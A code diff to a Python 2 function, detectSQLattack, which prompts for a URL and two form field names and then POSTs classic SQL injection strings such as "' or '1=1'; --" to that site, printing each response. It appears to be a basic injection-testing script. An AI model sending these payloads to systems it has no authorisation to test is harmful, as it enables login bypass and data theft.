@@ -6,20 +6,41 @@ def detectSQLattack():
     url = raw_input()
     # Get the number of form fields
     print 'Please enter the number of form fields in the website : '
-    n = raw_input()
+    n = int(raw_input())
     # Get the names and values in each of the form fields
     jsonData = {}
-    for i in range(n):
-        print 'Enter name of form field ',i+1
-        fieldName = raw_input()
-        print 'Enter value of form field ',i+1
-        fieldValue = raw_input()
-        jsonData[fieldName] = fieldValue
-    # Request the url
-    result = requests.post(url, jsonData)
-    # Check the time
-    if float(result.elapsed.total_seconds()) > 1:
-        return 1
-    else:
-        return 0
+    print 'Enter name of form field 1'
+    fieldName1 = raw_input()
+    print 'Enter name of form field 2'
+    fieldName2 = raw_input()
+    # Check different cases
+    print 'Checking for classic case'
+    fieldValue1 = "\\' or '1=1'; -- "
+    fieldValue2 = ''
+    jsonData[fieldName1] = fieldValue1
+    jsonData[fieldName2] = fieldValue2
+    response = requests.post(url,jsonData)
+    print response.text
 
+    print 'Checking for error messages'
+
+
+    fieldValue1 = "\\' or '1=1"
+    fieldValue2 = "\\' or '1=1"
+    jsonData[fieldName1] = fieldValue1
+    jsonData[fieldName2] = fieldValue2
+    response = requests.post(url,jsonData)
+    print response.text
+
+
+    print 'Checking for error messages'
+
+
+    fieldValue1 = ""
+    fieldValue2 = "\\' or '1=1'; -- "
+    jsonData[fieldName1] = fieldValue1
+    jsonData[fieldName2] = fieldValue2
+    response = requests.post(url, jsonData)
+    print response.text
+
+    print 'Checking for error messages'
